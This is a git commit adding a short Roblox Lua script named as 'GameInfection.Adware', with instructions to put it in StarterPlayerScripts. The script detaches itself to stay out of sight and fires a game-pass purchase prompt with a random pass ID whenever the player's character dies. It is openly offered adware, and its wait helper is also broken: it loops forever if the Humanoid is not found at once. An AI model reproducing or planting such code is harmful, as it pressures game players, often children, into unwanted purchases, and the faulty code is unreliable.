35ea9128aee62811a6d9fb279ecd16732fd7316f
realbxnnie <130217662+realbxnnie@users.noreply.github.com>
2024-08-15 19:38:06 +0300

    Create Roblox.GameInfection.Adware.lua

---
+++ Roblox.GameInfection.Adware.lua
@@ -0,0 +1,21 @@
+-- https://github.com/realbxnnie
+-- Put in StarterPlayer > StarterPlayerScripts
+
+local passes = {
+	0, 1, 2, 3
+}
+
+script.Parent = nil
+
+function WaitForChildOfClass(Parent, Class)
+	local Child = Parent:FindFirstChildOfClass(Class)
+	repeat wait() until Child ~= nil
+	return Child
+end
+
+local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+local hum = WaitForChildOfClass(char, "Humanoid")
+
+hum.Died:Connect(function()
+     game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, passes[math.random(1, #passes)])
+end)
